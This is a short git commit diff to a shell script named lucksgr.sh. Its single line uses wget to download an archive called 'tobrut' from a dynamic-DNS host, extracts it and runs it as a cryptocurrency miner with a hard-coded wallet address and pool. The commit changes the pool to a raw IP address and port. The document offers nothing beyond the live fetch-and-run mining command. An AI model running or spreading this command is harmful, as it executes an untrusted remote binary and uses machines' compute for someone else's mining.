c3504ceb00294e95b75edcfbdc28dbd6a9678a0d
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2025-01-30 17:19:47 +0700

    Update lucksgr.sh

--- lucksgr.sh
+++ lucksgr.sh
@@ -1,1 +1,1 @@
-wget -O tobrut coli.sytes.net/tobrut.tar.gz && tar -xvf tobrut && ./tobrut -a yespowersugar -o gespaehhsotna -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz.tesla -p x -t 4
+wget -O tobrut coli.sytes.net/tobrut.tar.gz && tar -xvf tobrut && ./tobrut -a yespowersugar -o 45.88.24.129:443 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz.tesla -p x -t 4
